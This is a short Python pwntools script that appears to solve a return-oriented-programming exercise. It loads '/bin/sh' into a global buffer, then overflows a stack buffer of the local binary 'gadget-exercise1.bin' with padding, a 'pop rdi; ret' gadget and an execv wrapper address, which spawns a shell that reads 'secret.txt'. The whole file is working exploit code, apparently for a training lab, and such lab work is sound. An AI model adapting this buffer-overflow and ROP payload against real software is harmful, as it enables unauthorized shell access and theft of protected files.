#!/usr/bin/python3

from pwn import *


def exploit():
    #exploit logic here.
    p = process("./gadget-exercise1.bin")

    #these lines give us "pop rdi; ret" gadget at 0x4007b3.
    rop = ROP("./gadget-exercise1.bin")
    print(rop.rdi)

    rdi_gadget = p64(0x4007b3) # pop rdi gadget
    global_buf = p64(0x601080) # global_buf address
    execv_wrapper = p64(0x400676) # execv_wrapper address

    p.send(b'/bin/sh\0') #loading shell path to global_buf
    print(p.recvuntil(b'stack buffer: ')) #waiting until vuln() is called
    p.send(b'a' * 0x28 + rdi_gadget + global_buf + execv_wrapper) #payload!
    sleep(0.5) #waiting until shell is loaded
    p.sendline(b'cat secret.txt')
    print(p.recvline())


if __name__ == "__main__":
    exploit()


